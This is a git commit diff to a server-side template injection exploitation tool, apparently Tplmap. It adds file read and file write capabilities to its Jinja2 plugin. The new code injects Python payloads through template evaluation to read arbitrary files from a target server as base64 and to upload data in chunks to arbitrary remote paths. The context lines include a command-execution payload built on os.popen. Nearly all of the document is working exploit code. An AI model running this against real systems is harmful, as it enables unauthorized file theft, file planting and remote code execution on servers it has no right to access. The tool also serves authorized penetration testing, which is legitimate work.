02ff9bf242b18c337627c454c0555297bc56074c
Emilio Pinna <emilio.pinn@gmail.com>
2016-07-09 23:57:56 +0100

    Add --write-file and --read-file to Jinja2 plugin

--- plugins/engines/jinja2.py
+++ plugins/engines/jinja2.py
@@ -1,7 +1,7 @@
+from utils.strings import quote, chunkit, base64encode, base64decode, md5
 from core.check import Check
 from utils.loggers import log
 from utils import rand
-from utils.strings import quote
 
 class Jinja2(Check):
 
@@ -50,3 +50,55 @@ class Jinja2(Check):
 
         execution_code = '__import__("os").popen("%s").read()' % quote(command)
         return self.evaluate(execution_code)
+
+    def detect_read(self):
+        self.set('read', True)
+
+    def _md5(self, remote_path):
+        
+        execution_code = """__import__("hashlib").md5(open("%s", 'rb').read()).hexdigest()""" % remote_path
+
+        return self.evaluate(execution_code)
+        
+    def read(self, remote_path):
+                
+        # Get remote file md5
+        md5_remote = self._md5(remote_path)
+            
+        if not md5_remote:
+            log.warn('Error getting remote file md5, check presence and permission')
+            return
+    
+        data_b64encoded = self.evaluate("""__import__("base64").b64encode(open("%s", "rb").read())""" %  remote_path)
+        data = base64decode(data_b64encoded)
+        
+        if not md5(data) == md5_remote:
+            log.warn('Remote file md5 mismatch, check manually')
+        else:
+            log.info('File downloaded correctly')
+            
+        return data
+        
+    def detect_write(self):
+        self.set('write', True)
+        
+    def write(self, data, remote_path):
+        
+        # Check existance and overwrite with --force-overwrite
+        if self._md5(remote_path):
+            if not self.channel.args.get('force_overwrite'):
+                log.warn('Remote path already exists, use --force-overwrite for overwrite')
+                return
+            else:
+                self.evaluate("""open("%s", 'w').close()""" % remote_path)
+        
+        # Upload file in chunks of 500 characters
+        for chunk in chunkit(data, 500):
+
+            chunk_b64 = base64encode(chunk)
+            self.evaluate("""open("%s", 'ab+').write(__import__("base64").b64decode('%s'))""" % (remote_path, chunk_b64))
+        
+        if not md5(data) == self._md5(remote_path):
+            log.warn('Remote file md5 mismatch, check manually')
+        else:
+            log.warn('File uploaded correctly')
